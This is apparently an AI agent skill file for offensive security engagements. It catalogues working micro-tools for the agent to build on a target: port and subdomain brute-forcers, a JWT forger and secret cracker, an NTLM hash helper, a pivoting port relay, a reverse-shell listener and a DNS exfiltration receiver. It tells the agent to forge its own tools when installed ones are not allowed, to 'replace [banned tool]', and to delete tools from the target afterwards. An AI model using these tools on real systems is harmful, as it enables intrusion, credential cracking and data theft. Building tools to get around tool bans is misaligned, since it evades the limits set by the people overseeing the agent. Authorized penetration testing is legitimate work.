---
name: forge
description: >-
  Forge — Micro-Tool Building Blueprints — When native primitives are insufficient and no installed
  tool is allowed, you BUILD one from Tier-1 runtimes (Python/Go/Node) or in-box .NET (`Add-Type`).
  This is the catalog of forge blueprints — each is a self-contained micro-tool designed to be
  written, used, and deleted within the engagement. Triggers: forge, build a tool, callback server,
  OAST, port scanner tool, wordlist generator, JWT toolkit, smuggler, raw socket, native tool builder,
  replace [banned tool].
license: MIT
metadata:
  user-invocable: "false"
  origin: agents/forge/forge.md (verbatim; frontmatter prefixado)
  progressive-disclosure: index-first
---
# Forge — Micro-Tool Building Blueprints
_Last updated: 2026-06-25_

When native primitives are insufficient and no installed tool is allowed, you BUILD one from Tier-1 runtimes (Python/Go/Node) or in-box .NET (`Add-Type`). This is the catalog of forge blueprints — each is a self-contained micro-tool designed to be written, used, and deleted within the engagement.

See also `flows-forge.md` for the dispatch flow and `native-tooling-doctrine.md` for escalation rules.

## Index
| # | Blueprint | Purpose | Runtime | Tags |
|---|-----------|---------|---------|------|
| B1 | Port scanner | Fast parallel port scan | Go or Python | forge, recon |
| B2 | Content buster | Parallel HTTP path brute | Python | forge, web-inventory |
| B3 | Subdomain brute | DNS subdomain brute-force | Python | forge, web-inventory |
| B4 | Wordlist generator | Context-aware wordlist from target data | Python | forge, recon |
| B5 | Param miner | Discover hidden GET/POST params | Python | forge, web-inventory |
| B6 | Raw-socket smuggler | HTTP request smuggling tester | Python | forge, web-testing |
| B7 | JWT toolkit | Decode / forge / brute JWT | Python or Node | forge, web-testing |
| B8 | Callback / OAST server | Receive OOB callbacks | Python | forge, infra |
| B9 | SQLi extractor | Automated blind SQLi extraction | Python | forge, web-testing |
| B10 | Port forwarder / relay | Local port forward or relay | Go or Python | forge, pivot |
| B11 | JS deobfuscator | Unpack/beautify obfuscated JS | Node | forge, web-inventory |
| B12 | AD enum collector | Bulk ADSI LDAP queries | PowerShell + Add-Type | forge, directory-review |
| B13 | Hash helper | NTLM/NTLMv2/Kerberos hash ops | Python | forge, cred-access |
| B14 | Reverse shell handler | Catch reverse connections | Python | forge, post-exploit |
| B15 | DNS exfil server | Receive DNS exfil queries | Python | forge, data-egress-check |

## Blueprints

### B1: Port scanner
Purpose: Scan TCP ports faster than sequential `Test-NetConnection`.
Runtime: Go (compiled, fastest) or Python (ThreadPoolExecutor).
```go
// forge-portscan.go — Tier: 1-go | Escalation: Go goroutines for parallel connect()
package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	host := os.Args[1]
	ports := os.Args[2] // "1-1024" or "80,443,8080"
	var wg sync.WaitGroup
	sem := make(chan struct{}, 100)

	scan := func(p int) {
		defer wg.Done()
		sem <- struct{}{}
		defer func() { <-sem }()
		addr := fmt.Sprintf("%s:%d", host, p)
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err == nil {
			fmt.Printf("[OPEN] %s\n", addr)
			conn.Close()
		}
	}

	if strings.Contains(ports, "-") {
		parts := strings.Split(ports, "-")
		lo, _ := strconv.Atoi(parts[0])
		hi, _ := strconv.Atoi(parts[1])
		for p := lo; p <= hi; p++ {
			wg.Add(1)
			go scan(p)
		}
	} else {
		for _, ps := range strings.Split(ports, ",") {
			p, _ := strconv.Atoi(strings.TrimSpace(ps))
			wg.Add(1)
			go scan(p)
		}
	}
	wg.Wait()
}
```
Build: `go build -o portscan.exe forge-portscan.go` | Run: `.\portscan.exe 10.0.0.1 1-1024`

### B2: Content buster
See `web-inventory.md T2` — the Python ThreadPoolExecutor script IS the forge blueprint.

### B3: Subdomain brute
Purpose: DNS brute-force subdomains from a wordlist.
Runtime: Python.
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: parallelism for large wordlists
import sys, socket, concurrent.futures

DOMAIN = sys.argv[1]
WORDS  = open(sys.argv[2]).read().splitlines()

def resolve(word):
    fqdn = f"{word}.{DOMAIN}"
    try:
        ip = socket.gethostbyname(fqdn)
        return f"[FOUND] {fqdn} -> {ip}"
    except socket.gaierror:
        return None

with concurrent.futures.ThreadPoolExecutor(30) as ex:
    for r in ex.map(resolve, WORDS):
        if r:
            print(r)
```

### B4: Wordlist generator
Purpose: Build a context-aware wordlist from target data (scraped words, tech terms, usernames).
Runtime: Python.
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: regex + permutation logic
import re, sys, itertools

source = open(sys.argv[1]).read()
words = set(re.findall(r'[a-zA-Z]{3,}', source))
numbers = ["", "1", "123", "2024", "2025", "2026", "!"]
out = set()
for w in words:
    out.add(w.lower())
    out.add(w.capitalize())
    for n in numbers:
        out.add(w.lower() + n)
        out.add(w.capitalize() + n)

for w in sorted(out):
    print(w)
```

### B5: Param miner
Purpose: Discover hidden GET/POST parameters by brute-forcing param names.
Runtime: Python.
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: parallel param brute
import sys, urllib.request, concurrent.futures

URL      = sys.argv[1]
WORDS    = open(sys.argv[2]).read().splitlines()
BASE_LEN = len(urllib.request.urlopen(URL, timeout=10).read())

def check(param):
    try:
        r = urllib.request.urlopen(f"{URL}?{param}=hkaud1337", timeout=5)
        body = r.read()
        if len(body) != BASE_LEN:
            return f"[PARAM] {param} (size diff: {len(body)} vs {BASE_LEN})"
    except:
        pass
    return None

with concurrent.futures.ThreadPoolExecutor(15) as ex:
    for r in ex.map(check, WORDS):
        if r:
            print(r)
```

### B6: Raw-socket smuggler
See `web-testing.md T14` — the raw-socket Python script IS the forge blueprint.

### B7: JWT toolkit
Purpose: Decode, forge, and brute-force JWT secrets.
Runtime: Python (stdlib only — `hmac`, `hashlib`, `base64`, `json`).
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: HMAC-SHA256 brute requires compiled hash loops
import base64, json, hmac, hashlib, sys

def b64url_decode(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def decode_jwt(token):
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload

def forge_jwt(payload, secret, header=None):
    if header is None:
        header = {"alg": "HS256", "typ": "JWT"}
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload).encode())
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"

def brute_jwt(token, wordlist_path):
    parts = token.split(".")
    msg = f"{parts[0]}.{parts[1]}".encode()
    target_sig = b64url_decode(parts[2])
    for secret in open(wordlist_path).read().splitlines():
        sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
        if sig == target_sig:
            return secret
    return None

if __name__ == "__main__":
    cmd = sys.argv[1]
    if cmd == "decode":
        h, p = decode_jwt(sys.argv[2])
        print(f"Header:  {json.dumps(h, indent=2)}")
        print(f"Payload: {json.dumps(p, indent=2)}")
    elif cmd == "brute":
        secret = brute_jwt(sys.argv[2], sys.argv[3])
        print(f"[FOUND] Secret: {secret}" if secret else "[FAIL] Not found")
    elif cmd == "forge":
        payload = json.loads(sys.argv[2])
        secret = sys.argv[3]
        print(forge_jwt(payload, secret))
```

### B8: Callback / OAST server
Purpose: Receive out-of-band callbacks (SSRF, XXE, RCE confirmation).
Runtime: Python.
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: HTTP server with logging
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys, datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[{datetime.datetime.now()}] GET {self.path} from {self.client_address[0]}")
        print(f"  Headers: {dict(self.headers)}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        print(f"[{datetime.datetime.now()}] POST {self.path} from {self.client_address[0]}")
        print(f"  Body ({length}B): {body[:500]}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

port = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
print(f"[*] Listening on 0.0.0.0:{port}")
HTTPServer(("0.0.0.0", port), Handler).serve_forever()
```

### B9: SQLi extractor
See `web-testing.md T4` — the blind extraction Python script IS the forge blueprint.

### B10: Port forwarder / relay
Purpose: Forward a local port to a remote target (pivoting without SSH).
Runtime: Python.
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: bidirectional socket relay
import socket, threading, sys

LOCAL_PORT  = int(sys.argv[1])
REMOTE_HOST = sys.argv[2]
REMOTE_PORT = int(sys.argv[3])

def relay(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data: break
            dst.sendall(data)
    except: pass
    finally: src.close(); dst.close()

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", LOCAL_PORT))
srv.listen(5)
print(f"[*] Forwarding 0.0.0.0:{LOCAL_PORT} -> {REMOTE_HOST}:{REMOTE_PORT}")

while True:
    client, addr = srv.accept()
    print(f"[+] Connection from {addr}")
    remote = socket.socket()
    remote.connect((REMOTE_HOST, REMOTE_PORT))
    threading.Thread(target=relay, args=(client, remote), daemon=True).start()
    threading.Thread(target=relay, args=(remote, client), daemon=True).start()
```

### B11: JS deobfuscator
Purpose: Beautify and partially deobfuscate JavaScript bundles.
Runtime: Node.
```javascript
#!/usr/bin/env node
// Tier: 1-node | Escalation: JS AST parsing for deobfuscation
const fs = require('fs');
const code = fs.readFileSync(process.argv[2], 'utf8');

// basic beautification (indent + newlines)
let depth = 0;
let out = '';
let inStr = false;
let strChar = '';
for (let i = 0; i < code.length; i++) {
    const c = code[i];
    if (inStr) {
        out += c;
        if (c === strChar && code[i-1] !== '\\') inStr = false;
        continue;
    }
    if (c === '"' || c === "'" || c === '`') { inStr = true; strChar = c; out += c; continue; }
    if (c === '{' || c === '[') { out += c + '\n' + '  '.repeat(++depth); continue; }
    if (c === '}' || c === ']') { out += '\n' + '  '.repeat(--depth) + c; continue; }
    if (c === ';') { out += ';\n' + '  '.repeat(depth); continue; }
    if (c === ',') { out += ',\n' + '  '.repeat(depth); continue; }
    out += c;
}

// hex/unicode string decode
out = out.replace(/\\x([0-9a-fA-F]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));
out = out.replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));

console.log(out);
```

### B12: AD enum collector
Purpose: Bulk LDAP queries via in-box ADSI/DirectorySearcher — structured output.
Runtime: PowerShell + Add-Type (Tier 0).
```powershell
# Tier: 0-native (ADSI is in-box .NET)
$searcher = [adsisearcher]""
$queries = @{
    Users         = "(&(objectClass=user)(objectCategory=person))"
    Computers     = "(objectClass=computer)"
    Groups        = "(objectClass=group)"
    SPNs          = "(&(servicePrincipalName=*)(objectClass=user))"
    AdminCount    = "(&(adminCount=1)(objectClass=user))"
    Disabled      = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
    NeverExpires  = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
}
foreach ($name in $queries.Keys) {
    $searcher.Filter = $queries[$name]
    $results = $searcher.FindAll()
    "$name : $($results.Count) results"
    $results | ForEach-Object { "  $($_.Properties['samaccountname'])" }
}
```

### B13: Hash helper
Purpose: Compute / manipulate NTLM, NTLMv2 hashes and Kerberos material.
Runtime: Python (hashlib + struct).
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: NTLM hash computation needs MD4 via hashlib
import hashlib, binascii, sys

def ntlm_hash(password):
    return binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode()

if __name__ == "__main__":
    cmd = sys.argv[1]
    if cmd == "ntlm":
        print(f"NTLM: {ntlm_hash(sys.argv[2])}")
    elif cmd == "verify":
        computed = ntlm_hash(sys.argv[2])
        target = sys.argv[3].lower()
        print(f"{'[MATCH]' if computed == target else '[NO MATCH]'} {computed}")
```

### B14: Reverse shell handler
Purpose: Catch incoming reverse shell connections.
Runtime: Python.
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: interactive socket I/O
import socket, sys, select

port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", port))
srv.listen(1)
print(f"[*] Listening on 0.0.0.0:{port}")
conn, addr = srv.accept()
print(f"[+] Connection from {addr}")

while True:
    r, _, _ = select.select([conn, sys.stdin], [], [])
    if conn in r:
        data = conn.recv(4096)
        if not data: break
        sys.stdout.write(data.decode(errors='replace'))
        sys.stdout.flush()
    if sys.stdin in r:
        cmd = sys.stdin.readline()
        conn.sendall(cmd.encode())
conn.close()
```

### B15: DNS exfil server
Purpose: Authoritative DNS server to receive exfil queries (pairs with `data-egress-check T2`).
Runtime: Python.
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: raw UDP DNS parsing
import socket, struct, sys

PORT = 53
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", PORT))
print(f"[*] DNS listener on UDP {PORT}")

labels_collected = {}
while True:
    data, addr = sock.recvfrom(512)
    # parse question name
    pos = 12; labels = []
    while data[pos] != 0:
        length = data[pos]; pos += 1
        labels.append(data[pos:pos+length].decode(errors='replace')); pos += length
    qname = ".".join(labels)
    print(f"[DNS] {addr[0]} -> {qname}")
    if len(labels) >= 3:
        idx, chunk = labels[0], labels[1]
        labels_collected[idx] = chunk

    # respond with NXDOMAIN
    resp = data[:2] + b'\x81\x83' + data[4:6] + b'\x00\x00\x00\x00\x00\x00' + data[12:]
    sock.sendto(resp, addr)
```

## Forge Discipline

1. Every forged tool gets a 2-line header: `# Tier: 1-{runtime} | Escalation: {reason}`
2. Delete the tool from the target after use
3. Record in `ccGadgets.md` with tier, purpose, and cleanup confirmation
4. If the Go compiler or Python is not available on the target, you cannot forge — fall back to the native (slower) approach or report the limitation
